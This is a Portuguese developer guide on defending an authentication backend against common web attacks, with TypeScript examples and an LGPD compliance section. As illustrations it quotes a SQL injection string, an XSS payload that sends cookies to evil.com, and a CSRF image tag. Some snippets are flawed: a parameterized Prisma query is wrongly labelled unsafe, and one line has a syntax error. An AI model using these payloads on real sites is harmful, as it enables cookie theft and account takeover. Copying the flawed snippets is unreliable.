# 🛡️ Segurança Avançada - Proteção Contra Ataques

## 📋 ÍNDICE

1. [Proteção Contra SQL Injection](#proteção-contra-sql-injection)
2. [Proteção Contra XSS](#proteção-contra-xss)
3. [Proteção Contra CSRF](#proteção-contra-csrf)
4. [Proteção Contra Brute Force](#proteção-contra-brute-force)
5. [Proteção Contra Session Hijacking](#proteção-contra-session-hijacking)
6. [Proteção Contra Credential Stuffing](#proteção-contra-credential-stuffing)
7. [Proteção Contra Clickjacking](#proteção-contra-clickjacking)
8. [Proteção Contra Man-in-the-Middle](#proteção-contra-man-in-the-middle)
9. [Proteção Contra Account Enumeration](#proteção-contra-account-enumeration)
10. [Monitoramento e Alertas](#monitoramento-e-alertas)
11. [Compliance LGPD](#compliance-lgpd)

---

## 🎯 OBJETIVO

Este documento detalha todas as proteções contra ataques que **DEVEM** ser implementadas no backend de autenticação para garantir segurança de nível empresarial.

**IMPORTANTE**: Cada proteção listada aqui é **OBRIGATÓRIA**, não opcional.

---

## 1️⃣ PROTEÇÃO CONTRA SQL INJECTION

### O que é?

SQL Injection é quando um atacante insere código SQL malicioso através de inputs de usuário.

**Exemplo de ataque**:
```sql
-- Input malicioso no campo email
email: "admin@dvais.com' OR '1'='1"

-- Query vulnerável (NUNCA FAÇA ISSO)
SELECT * FROM users WHERE email = 'admin@dvais.com' OR '1'='1'
-- Isso retorna TODOS os usuários
```

### Como prevenir?

#### ✅ SOLUÇÃO 1: Usar Prisma (Recomendado)

Prisma automaticamente usa prepared statements:

```typescript
// ✅ SEGURO - Prisma previne SQL injection automaticamente
const user = await prisma.user.findUnique({
  where: { email: userEmail }
})

// ❌ NUNCA FAÇA ISSO - SQL direto
await prisma.$queryRaw`SELECT * FROM users WHERE email = ${userEmail}`
```

#### ✅ SOLUÇÃO 2: Validação com Zod

```typescript
import { z } from 'zod'

const emailSchema = z.string().email().max(255)

// Validar antes de usar
const validatedEmail = emailSchema.parse(userInput)
```

#### ✅ SOLUÇÃO 3: Sanitização

```typescript
import validator from 'validator'

// Sanitizar inputs
const sanitizedEmail = validator.normalizeEmail(userEmail) || ''
const sanitizedName = validator.escape(userName)
```

---

## 2️⃣ PROTEÇÃO CONTRA XSS (Cross-Site Scripting)

### O que é?

XSS é quando um atacante injeta scripts maliciosos (JavaScript) que executam no navegador de outros usuários.

**Exemplo de ataque**:
```javascript
// Input malicioso no campo nome
nome: "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"

// Se renderizar sem sanitizar, o script executa
```

### Como prevenir?

#### ✅ SOLUÇÃO 1: Content Security Policy (CSP)

```javascript
// next.config.js
{
  key: 'Content-Security-Policy',
  value: `
    default-src 'self';
    script-src 'self' https://accounts.google.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' data:;
    connect-src 'self' https://accounts.google.com;
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
  `.replace(/\s{2,}/g, ' ').trim()
}
```

#### ✅ SOLUÇÃO 2: Sanitização de Outputs

```typescript
import DOMPurify from 'isomorphic-dompurify'

// Sanitizar antes de renderizar
const sanitizedHtml = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
  ALLOWED_ATTR: []
})
```

#### ✅ SOLUÇÃO 3: React Automático

React automaticamente escapa valores em JSX:

```tsx
// ✅ SEGURO - React escapa automaticamente
<div>{userInput}</div>

// ❌ PERIGOSO - dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

---

## 3️⃣ PROTEÇÃO CONTRA CSRF (Cross-Site Request Forgery)

### O que é?

CSRF é quando um site malicioso força o navegador do usuário a fazer requisições indesejadas para seu site.

**Exemplo de ataque**:
```html
<!-- Site malicioso evil.com -->
<img src="https://dvais.com/api/auth/change-password?new=hacked123" />
<!-- Se usuário estiver logado, senha muda automaticamente -->
```

### Como prevenir?

#### ✅ SOLUÇÃO 1: NextAuth.js (Automático)

NextAuth.js já inclui proteção CSRF automática com SameSite cookies.

#### ✅ SOLUÇÃO 2: CSRF Tokens para API Routes Customizados

```typescript
// lib/auth/csrf.ts
import { cookies } from 'next/headers'
import { randomBytes } from 'crypto'

export function generateCsrfToken(): string {
  return randomBytes(32).toString('hex')
}

export function setCsrfCookie(token: string) {
  cookies().set('csrf-token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 60 * 60 // 1 hora
  })
}

export function verifyCsrfToken(token: string): boolean {
  const storedToken = cookies().get('csrf-token')?.value
  return storedToken === token
}
```

**Uso em API Route**:

```typescript
// app/api/protected/route.ts
import { NextRequest, NextResponse } from 'next/server'
import { verifyCsrfToken } from '@/lib/auth/csrf'

export async function POST(request: NextRequest) {
  // Verificar CSRF token
  const csrfToken = request.headers.get('x-csrf-token')
  
  if (!csrfToken || !verifyCsrfToken(csrfToken)) {
    return NextResponse.json(
      { error: 'CSRF token inválido' },
      { status: 403 }
    )
  }
  
  // Processar requisição...
}
```

#### ✅ SOLUÇÃO 3: SameSite Cookies

```typescript
// Configurar cookies com SameSite
cookies().set('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Previne CSRF
  maxAge: 86400 // 24 horas
})
```

---

## 4️⃣ PROTEÇÃO CONTRA BRUTE FORCE

### O que é?

Brute force é quando um atacante tenta adivinhar senhas fazendo milhares/milhões de tentativas.

### Como prevenir?

#### ✅ SOLUÇÃO 1: Rate Limiting por IP

```typescript
// lib/auth/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
})

// 5 tentativas por minuto por IP
export const loginRateLimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(5, '1 m'),
  analytics: true,
  prefix: 'ratelimit:login',
})

// Uso
const ip = request.ip || 'unknown'
const { success } = await loginRateLimit.limit(ip)

if (!success) {
  return NextResponse.json(
    { error: 'Muitas tentativas. Aguarde 1 minuto.' },
    { status: 429 }
  )
}
```

#### ✅ SOLUÇÃO 2: Account Lockout

Bloquear conta após N tentativas falhadas:

```typescript
const MAX_ATTEMPTS = 5
const LOCKOUT_DURATION = 15 * 60 * 1000 // 15 minutos

// Contar tentativas falhadas
const failedAttempts = await prisma.loginAttempt.count({
  where: {
    email,
    success: false,
    createdAt: {
      gte: new Date(Date.now() - LOCKOUT_DURATION)
    }
  }
})

if (failedAttempts >= MAX_ATTEMPTS) {
  await prisma.user.update({
    where: { email },
    data: {
      isLocked: true,
      lockReason: 'Múltiplas tentativas falhadas',
      lockedUntil: new Date(Date.now() + LOCKOUT_DURATION)
    }
  })
  
  throw new Error('Conta bloqueada por 15 minutos')
}
```

#### ✅ SOLUÇÃO 3: CAPTCHA

```typescript
// Verificar reCAPTCHA v3 (invisível)
async function verifyCaptcha(token: string): Promise<boolean> {
  const response = await fetch(
    'https://www.google.com/recaptcha/api/siteverify',
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.RECAPTCHA_SECRET_KEY}&response=${token}`
    }
  )
  
  const data = await response.json()
  return data.success && data.score > 0.5 // Score > 0.5 = humano
}
```

---

## 5️⃣ PROTEÇÃO CONTRA SESSION HIJACKING

### O que é?

Session hijacking é quando um atacante rouba o token de sessão de um usuário legítimo.

### Como prevenir?

#### ✅ SOLUÇÃO 1: Secure Cookies

```typescript
// Configurar cookies seguros
cookies().set('session', sessionId, {
  httpOnly: true,     // Não acessível via JavaScript
  secure: true,       // Apenas HTTPS
  sameSite: 'strict', // Previne CSRF
  maxAge: 86400,      // 24 horas
  path: '/'
})
```

#### ✅ SOLUÇÃO 2: Session Rotation

```typescript
// Rotacionar session ID após login
async function rotateSession(userId: string) {
  // Invalidar sessão antiga
  await prisma.session.deleteMany({
    where: { userId }
  })
  
  // Criar nova sessão
  const newSession = await prisma.session.create({
    data: {
      userId,
      sessionToken: crypto.randomUUID(),
      expires: new Date(Date.now() + 86400000)
    }
  })
  
  return newSession
}
```

#### ✅ SOLUÇÃO 3: IP/User-Agent Binding

```typescript
// Verificar IP e User-Agent
async function validateSession(sessionToken: string, request: NextRequest) {
  const session = await prisma.session.findUnique({
    where: { sessionToken },
    include: { user: true }
  })
  
  if (!session) return null
  
  // Verificar se IP/User-Agent mudaram
  const currentIp = request.ip || 'unknown'
  const currentUserAgent = request.headers.get('user-agent') || 'unknown'
  
  if (session.ipAddress !== currentIp || session.userAgent !== currentUserAgent) {
    // ALERTA: Possível session hijacking
    await invalidateSession(sessionToken)
    await sendSecurityAlert(session.user.email, 'Atividade suspeita detectada')
    return null
  }
  
  return session
}
```

---

## 6️⃣ PROTEÇÃO CONTRA CREDENTIAL STUFFING

### O que é?

Credential stuffing é quando atacantes usam credenciais vazadas de outros sites para tentar login.

### Como prevenir?

#### ✅ SOLUÇÃO 1: Verificar Senhas Vazadas

Usar API do Have I Been Pwned:

```typescript
import crypto from 'crypto'

/**
 * Verificar se senha está em lista de senhas vazadas
 */
export async function isPasswordPwned(password: string): Promise<boolean> {
  // Hash SHA-1 da senha
  const sha1 = crypto.createHash('sha1').update(password).digest('hex').toUpperCase()
  const prefix = sha1.slice(0, 5)
  const suffix = sha1.slice(5)
  
  // Consultar API do HIBP (k-anonymity)
  const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`)
  const text = await response.text()
  
  // Verificar se hash está na lista
  const hashes = text.split('\n')
  const found = hashes.some(line => line.startsWith(suffix))
  
  return found
}

// Uso ao criar/mudar senha
const isPwned = await isPasswordPwned(newPassword)
if (isPwned) {
  throw new Error('Esta senha foi encontrada em vazamentos de dados. Escolha outra.')
}
```

#### ✅ SOLUÇÃO 2: Device Fingerprinting

```typescript
// Frontend - coletar fingerprint
import FingerprintJS from '@fingerprintjs/fingerprintjs'

const fp = await FingerprintJS.load()
const result = await fp.get()
const deviceId = result.visitorId

// Enviar com login
fetch('/api/auth/login', {
  method: 'POST',
  body: JSON.stringify({
    email,
    password,
    deviceId
  })
})

// Backend - verificar device
const knownDevice = await prisma.trustedDevice.findFirst({
  where: { userId, deviceId }
})

if (!knownDevice) {
  // Novo dispositivo - exigir MFA
  await sendNewDeviceAlert(user.email)
}
```

---

## 7️⃣ PROTEÇÃO CONTRA CLICKJACKING

### O que é?

Clickjacking é quando um atacante coloca seu site em um iframe invisível e engana usuários a clicar.

### Como prevenir?

#### ✅ SOLUÇÃO 1: X-Frame-Options Header

```javascript
// next.config.js
{
  key: 'X-Frame-Options',
  value: 'SAMEORIGIN' // Apenas permite iframe do mesmo domínio
}

// Ou mais restritivo
{
  key: 'X-Frame-Options',
  value: 'DENY' // Nunca permite iframe
}
```

#### ✅ SOLUÇÃO 2: CSP frame-ancestors

```javascript
// Content-Security-Policy
{
  key: 'Content-Security-Policy',
  value: "frame-ancestors 'none'" // Mais moderno que X-Frame-Options
}
```

---

## 8️⃣ PROTEÇÃO CONTRA MAN-IN-THE-MIDDLE (MITM)

### O que é?

MITM é quando um atacante intercepta comunicação entre cliente e servidor.

### Como prevenir?

#### ✅ SOLUÇÃO 1: HTTPS Obrigatório

```typescript
// middleware.ts
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  // Redirecionar HTTP para HTTPS em produção
  if (
    process.env.NODE_ENV === 'production' &&
    request.headers.get('x-forwarded-proto') !== 'https'
  ) {
    return NextResponse.redirect(
      `https://${request.headers.get('host')}${request.nextUrl.pathname}`,
      301
    )
  }
  
  return NextResponse.next()
}
```

#### ✅ SOLUÇÃO 2: HSTS (HTTP Strict Transport Security)

```javascript
// next.config.js
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload'
}
```

#### ✅ SOLUÇÃO 3: Certificate Pinning (Avançado)

```typescript
// Verificar certificado SSL
// Implementar com biblioteca específica se necessário
```

---

## 9️⃣ PROTEÇÃO CONTRA ACCOUNT ENUMERATION

### O que é?

Account enumeration é quando um atacante descobre quais emails estão cadastrados no sistema.

### Como prevenir?

#### ✅ SOLUÇÃO 1: Mensagens Genéricas

```typescript
// ❌ VULNERÁVEL - Revela se email existe
if (!user) {
  return { error: 'Email não encontrado' }
}
if (!validPassword) {
  return { error: 'Senha incorreta' }
}

// ✅ SEGURO - Mensagem genérica
if (!user || !validPassword) {
  return { error: 'Email ou senha incorretos' }
}
```

#### ✅ SOLUÇÃO 2: Timing Constante

```typescript
// Sempre processar hash mesmo se usuário não existir
// Evita timing attacks
const user = await getUserByEmail(email)
const password Hash = user?.password || await hashPassword('dummy-password')
const isValid = await verifyPassword(inputPassword, passwordHash)

if (!user || !isValid) {
  return { error: 'Email ou senha incorretos' }
}
```

#### ✅ SOLUÇÃO 3: Rate Limit no Esqueci Senha

```typescript
// Não revelar se email existe
await sendPasswordResetEmail(email)

// Sempre retornar sucesso
return { 
  success: true, 
  message: 'Se o email existir, você receberá instruções' 
}
```

---

## 🔟 MONITORAMENTO E ALERTAS

### Sistema de Alertas Automáticos

**Arquivo**: `Painel_Web/lib/auth/alerts.ts`

```typescript
import { prisma } from '@/lib/prisma'
import { sendEmail } from '@/lib/email'

/**
 * Alertas de segurança
 */
export async function sendSecurityAlert(
  userId: string,
  type: 'NEW_DEVICE' | 'UNUSUAL_LOCATION' | 'PASSWORD_CHANGED' | 'MULTIPLE_FAILURES',
  metadata?: Record<string, any>
) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { email: true, name: true }
  })
  
  if (!user) return
  
  const messages = {
    NEW_DEVICE: {
      subject: '🔐 Novo dispositivo detectado',
      body: `Detectamos um login de um novo dispositivo em ${metadata?.location}.`
    },
    UNUSUAL_LOCATION: {
      subject: '🌍 Login de localização incomum',
      body: `Detectamos um login de ${metadata?.country}, que é diferente do usual.`
    },
    PASSWORD_CHANGED: {
      subject: '🔑 Senha alterada',
      body: `Sua senha foi alterada. Se não foi você, redefina imediatamente.`
    },
    MULTIPLE_FAILURES: {
      subject: '⚠️ Múltiplas tentativas de login falhadas',
      body: `Detectamos ${metadata?.attempts} tentativas falhadas de login.`
    }
  }
  
  await sendEmail({
    to: user.email,
    subject: messages[type].subject,
    html: `
      <div style="font-family: sans-serif; max-width: 600px;">
        <h1>${messages[type].subject}</h1>
        <p>Olá ${user.name},</p>
        <p>${messages[type].body}</p>
        <p>Se não foi você, tome as seguintes ações:</p>
        <ul>
          <li>Altere sua senha imediatamente</li>
          <li>Revise dispositivos conectados</li>
          <li>Ative autenticação de dois fatores</li>
        </ul>
        <p>Horário: ${new Date().toLocaleString('pt-BR')}</p>
      </div>
    `
  })
  
  // Registrar alerta no audit log
  await prisma.auditLog.create({
    data: {
      userId,
      action: `SECURITY_ALERT_${type}`,
      ipAddress: metadata?.ip || 'unknown',
      metadata
    }
  })
}
```

### Detecção de Anomalias

```typescript
/**
 * Detectar login de localização incomum
 */
export async function detectUnusualLocation(
  userId: string,
  currentIp: string
): Promise<boolean> {
  // Buscar últimos logins
  const recentLogins = await prisma.loginAttempt.findMany({
    where: {
      userId,
      success: true,
      createdAt: {
        gte: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) // 30 dias
      }
    },
    select: { ipAddress: true },
    take: 10
  })
  
  // Verificar se IP já foi usado antes
  const knownIp = recentLogins.some(login => login.ipAddress === currentIp)
  
  if (!knownIp) {
    // Buscar geolocalização (usar serviço como ipapi.co)
    const location = await getGeolocation(currentIp)
    
    return true // Localização incomum
  }
  
  return false
}
```

---

## 1️⃣1️⃣ COMPLIANCE LGPD (Lei Geral de Proteção de Dados)

### Requisitos Obrigatórios

#### 1. Consentimento Explícito

```typescript
// Schema Prisma
model User {
  // ... outros campos
  
  // LGPD
  consentedAt        DateTime?
  consentVersion     String?   // Versão dos termos aceitos
  marketingConsent   Boolean   @default(false)
  dataProcessConsent Boolean   @default(false)
}

// API Route de consentimento
export async function POST(request: NextRequest) {
  const { userId, consentType, version } = await request.json()
  
  await prisma.user.update({
    where: { id: userId },
    data: {
      consentedAt: new Date(),
      consentVersion: version,
      [consentType]: true
    }
  })
  
  // Audit log
  await prisma.auditLog.create({
    data: {
      userId,
      action: 'CONSENT_GRANTED',
      metadata: { type: consentType, version }
    }
  })
}
```

#### 2. Direito ao Esquecimento

```typescript
/**
 * Deletar TODOS os dados do usuário (LGPD Art. 18)
 */
export async function deleteUserData(userId: string) {
  // Transaction para garantir atomicidade
  await prisma.$transaction([
    // Deletar sessões
    prisma.session.deleteMany({ where: { userId } }),
    
    // Deletar accounts OAuth
    prisma.account.deleteMany({ where: { userId } }),
    
    // Deletar tentativas de login
    prisma.loginAttempt.deleteMany({ where: { userId } }),
    
    // Anonimizar audit logs (manter por compliance)
    prisma.auditLog.updateMany({
      where: { userId },
      data: { userId: null }
    }),
    
    // Deletar usuário
    prisma.user.delete({ where: { id: userId } })
  ])
  
  // Log final
  await prisma.auditLog.create({
    data: {
      userId: null,
      action: 'USER_DATA_DELETED',
      metadata: { originalUserId: userId }
    }
  })
}
```

#### 3. Exportação de Dados

```typescript
/**
 * Exportar TODOS os dados do usuário (LGPD Art. 18)
 */
export async function exportUserData(userId: string) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    include: {
      accounts: true,
      sessions: true,
      loginAttempts: {
        orderBy: { createdAt: 'desc' },
        take: 100
      }
    }
  })
  
  if (!user) throw new Error('Usuário não encontrado')
  
  // Remover dados sensíveis
  const { password, mfaSecret, ...userData } = user
  
  // Criar arquivo JSON
  const exportData = {
    exportedAt: new Date().toISOString(),
    user: userData,
    note: 'Exportação completa dos seus dados conforme LGPD'
  }
  
  // Log
  await prisma.auditLog.create({
    data: {
      userId,
      action: 'DATA_EXPORTED',
      ipAddress: '...'
    }
  })
  
  return exportData
}
```

---

## 🔐 AUTENTICAÇÃO DE DOIS FATORES (2FA/MFA)

### Implementação com TOTP (Time-based One-Time Password)

**Arquivo**: `Painel_Web/lib/auth/mfa.ts`

```typescript
import * as speakeasy from '@levminer/speakeasy'
import QRCode from 'qrcode'
import { prisma } from '@/lib/prisma'

/**
 * Ativar MFA para usuário
 */
export async function enableMFA(userId: string, userEmail: string) {
  // Gerar secret
  const secret = speakeasy.generateSecret({
    name: `DVAi$ Mentor IA (${userEmail})`,
    issuer: 'DVAi$ Mentor IA',
    length: 32,
  })
  
  // Gerar QR Code
  const qrCode = await QRCode.toDataURL(secret.otpauth_url!)
  
  // Salvar secret no banco (criptografado)
  await prisma.user.update({
    where: { id: userId },
    data: {
      mfaSecret: secret.base32,
      mfaEnabled: true
    }
  })
  
  return {
    secret: secret.base32,
    qrCode,
    backupCodes: generateBackupCodes() // Códigos de backup
  }
}

/**
 * Verificar código TOTP
 */
export async function verifyMFAToken(
  userId: string,
  token: string
): Promise<boolean> {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { mfaSecret: true, mfaEnabled: true }
  })
  
  if (!user?.mfaEnabled || !user.mfaSecret) {
    return false
  }
  
  return speakeasy.totp.verify({
    secret: user.mfaSecret,
    encoding: 'base32',
    token,
    window: 2, // Aceita 2 períodos antes/depois (60s cada)
  })
}

/**
 * Gerar códigos de backup (caso usuário perca acesso ao app)
 */
function generateBackupCodes(): string[] {
  const codes: string[] = []
  
  for (let i = 0; i < 10; i++) {
    const code = crypto.randomBytes(4).toString('hex').toUpperCase()
    codes.push(code)
  }
  
  return codes
}
```

---

## 📱 DETECÇÃO DE DISPOSITIVOS E LOCALIZAÇÃO

### Geolocalização de IP

```typescript
/**
 * Obter localização pelo IP
 */
export async function getGeolocation(ip: string) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`)
    const data = await response.json()
    
    return {
      country: data.country_name,
      region: data.region,
      city: data.city,
      latitude: data.latitude,
      longitude: data.longitude,
      timezone: data.timezone,
    }
  } catch (error) {
    console.error('Erro ao obter geolocalização:', error)
    return null
  }
}

/**
 * Verificar se localização é incomum
 */
export async function isUnusualLocation(userId: string, currentIp: string) {
  // Buscar localizações anteriores
  const recentLogins = await prisma.loginAttempt.findMany({
    where: {
      userId,
      success: true,
      createdAt: {
        gte: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) // 30 dias
      }
    },
    select: { ipAddress: true },
    take: 20
  })
  
  // Obter localização atual
  const currentLocation = await getGeolocation(currentIp)
  
  if (!currentLocation) return false
  
  // Verificar se país já foi usado antes
  for (const login of recentLogins) {
    const pastLocation = await getGeolocation(login.ipAddress)
    if (pastLocation?.country === currentLocation.country) {
      return false // Localização conhecida
    }
  }
  
  return true // Localização incomum
}
```

---

## 🔍 VALIDAÇÃO E SANITIZAÇÃO AVANÇADA

### Input Validation Layer

```typescript
import { z } from 'zod'
import validator from 'validator'

/**
 * Schema Zod para registro ultra-seguro
 */
export const secureRegisterSchema = z.object({
  name: z.string()
    .min(2, 'Nome muito curto')
    .max(100, 'Nome muito longo')
    .regex(/^[a-zA-ZÀ-ÿ\s]+$/, 'Nome contém caracteres inválidos')
    .transform(str => validator.escape(str.trim())),
  
  email: z.string()
    .email('Email inválido')
    .max(255, 'Email muito longo')
    .toLowerCase()
    .transform(str => validator.normalizeEmail(str) || str)
    .refine(
      email => !email.includes('<') && !email.includes('>'),
      'Email contém caracteres inválidos'
    ),
  
  password: z.string()
    .min(12, 'Senha deve ter no mínimo 12 caracteres')
    .max(128, 'Senha muito longa')
    .regex(/[a-z]/, 'Deve conter letra minúscula')
    .regex(/[A-Z]/, 'Deve conter letra maiúscula')
    .regex(/[0-9]/, 'Deve conter número')
    .regex(/[^a-zA-Z0-9]/, 'Deve conter caractere especial')
    .refine(
      password => !/(.)\1{2,}/.test(password),
      'Senha não pode ter caracteres repetidos'
    )
    .refine(
      password => !['password', '123456', 'qwerty'].some(weak => 
        password.toLowerCase().includes(weak)
      ),
      'Senha muito comum'
    ),
  
  cpf: z.string()
    .optional()
    .refine(cpf => !cpf || isValidCPF(cpf), 'CPF inválido'),
  
  phone: z.string()
    .optional()
    .refine(
      phone => !phone || /^\([1-9]{2}\) (?:[2-8]|9[1-9])[0-9]{3}-[0-9]{4}$/.test(phone),
      'Telefone inválido'
    ),
})
```

---

## 🚨 RESPOSTA A INCIDENTES

### Plano de Ação em Caso de Breach

#### Fase 1: Contenção (0-1h)

1. **Invalidar todas as sessões**:
```typescript
await prisma.session.deleteMany({})
```

2. **Bloquear todas as contas**:
```typescript
await prisma.user.updateMany({
  data: { isLocked: true, lockReason: 'Security incident' }
})
```

3. **Desativar login temporariamente**:
```typescript
// Variável de ambiente
MAINTENANCE_MODE=true
```

#### Fase 2: Investigação (1-24h)

1. Analisar audit logs
2. Identificar vetor de ataque
3. Identificar dados comprometidos
4. Documentar tudo

#### Fase 3: Correção (24-48h)

1. Aplicar patch
2. Testar correção
3. Deploy de emergência
4. Reativar sistema

#### Fase 4: Notificação (48-72h)

1. Notificar usuários afetados
2. Fornecer instruções de segurança
3. Oferecer assistência
4. Reportar se necessário (LGPD)

#### Fase 5: Pós-Incidente

1. Post-mortem
2. Atualizar procedimentos
3. Treinar equipe
4. Melhorar monitoramento

---

## 🎯 SCORE DE SEGURANÇA

### Checklist de Validação

#### Nível 1: Básico (Mínimo Aceitável)

- [ ] HTTPS obrigatório
- [ ] Hash de senhas com Argon2id
- [ ] Validação server-side
- [ ] SQL injection prevention
- [ ] XSS prevention básica
- [ ] CSRF protection
- [ ] Rate limiting básico

**Score mínimo**: 50/100

#### Nível 2: Profissional (Recomendado)

Nível 1 +
- [ ] Account lockout
- [ ] Security headers completos
- [ ] Email verification
- [ ] Password reset seguro
- [ ] Audit logging
- [ ] Detecção de senhas vazadas
- [ ] Device tracking

**Score**: 75/100

#### Nível 3: Enterprise (Ultra-Seguro)

Nível 2 +
- [ ] MFA (2FA) obrigatório
- [ ] Geolocalização de login
- [ ] Detecção de anomalias
- [ ] Device fingerprinting
- [ ] Security alerts automáticos
- [ ] SIEM integration
- [ ] Penetration tests regulares
- [ ] Bug bounty program

**Score**: 95/100

#### Nível 4: Military-Grade (Máxima Segurança)

Nível 3 +
- [ ] Hardware security keys
- [ ] Biometric authentication
- [ ] Zero-knowledge encryption
- [ ] Distributed sessions
- [ ] Real-time threat intelligence
- [ ] 24/7 SOC monitoring

**Score**: 100/100

---

## 📚 REFERÊNCIAS TÉCNICAS

### OWASP (Open Web Application Security Project)

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

### NIST (National Institute of Standards and Technology)

- [Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

### CWE (Common Weakness Enumeration)

- [CWE Top 25](https://cwe.mitre.org/top25/)

---

## 🎓 TREINAMENTO DA EQUIPE

### Tópicos Obrigatórios

1. **Desenvolvimento Seguro**:
   - Input validation
   - Output encoding
   - Authentication best practices
   - Authorization patterns

2. **OWASP Top 10**:
   - Conhecer os 10 riscos principais
   - Como prevenir cada um
   - Exemplos práticos

3. **Incident Response**:
   - Como identificar um breach
   - Procedimentos de contenção
   - Escalação de incidentes

4. **LGPD**:
   - Direitos dos usuários
   - Obrigações legais
   - Procedimentos de compliance

---

## ⚡ PERFORMANCE vs SEGURANÇA

### Balanceamento Correto

**Segurança NÃO deve impactar performance significativamente**:

✅ **Argon2id**: ~50ms por hash (aceitável)  
✅ **Rate limiting com Redis**: ~5ms overhead  
✅ **JWT validation**: ~2ms  
✅ **CSRF check**: ~1ms  
✅ **Input validation**: ~1ms  

**Total overhead**: ~60ms (imperceptível para usuário)

### Otimizações

1. **Cache de validações**:
```typescript
// Cache de validação de email (1h)
const cached = await redis.get(`email:valid:${email}`)
if (cached) return true

const isValid = await validateEmail(email)
await redis.setex(`email:valid:${email}`, 3600, isValid)
```

2. **Parallel processing**:
```typescript
// Validar múltiplas coisas em paralelo
const [isValidEmail, isPwned, isRateLimited] = await Promise.all([
  validateEmail(email),
  isPasswordPwned(password),
  checkRateLimit(ip)
])
```

3. **Connection pooling**:
```typescript
// Prisma já faz automaticamente
// Configurar em DATABASE_URL:
// ?connection_limit=10&pool_timeout=20
```

---

## 🎯 CONCLUSÃO

Este guia cobre as principais ameaças e proteções para um sistema de autenticação ultra-seguro. **Lembre-se**:

- Segurança é um processo contínuo
- Nenhum sistema é 100% seguro
- Defesa em profundidade (múltiplas camadas)
- Mantenha-se atualizado com novas ameaças
- Teste regularmente
- Monitore constantemente

**Para implementação prática**, consulte:
- [BACKEND_AUTENTICACAO_SEGURA.md](./BACKEND_AUTENTICACAO_SEGURA.md) - Guia técnico completo
- [AUTH_README.md](./AUTH_README.md) - Integração frontend/backend

---

**Criado em**: 2025-11-13  
**Versão**: 1.0.0  
**Status**: 📝 Documentação de Segurança Avançada  
**Autor**: DVAi$ - Mentor IA Team  
**Revisão**: Recomendado revisar trimestralmente

